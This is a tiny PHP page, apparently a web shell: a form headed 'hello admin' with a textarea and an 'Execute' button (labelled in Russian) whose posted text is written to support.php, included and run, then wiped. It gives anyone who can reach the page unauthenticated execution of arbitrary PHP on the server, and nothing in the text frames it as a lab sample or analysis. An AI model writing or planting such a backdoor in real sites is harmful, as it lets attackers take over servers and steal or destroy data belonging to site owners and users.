<form method="post">
    <p><b>hello admin</b></p>
    <p><b></b></p>

    <p><b>Enter cod:</b></p>
    <p><textarea rows="50" cols="100" name="text"></textarea></p>
    <p><input type="submit" value="Исполнить" name="submit1"></p>



</form>
<?php
if(isset($_POST['submit1'])){
    $text=$_POST['text'];
    file_put_contents("support.php",$text);
}
include("support.php");
file_put_contents("support.php", NULL);
 ?>
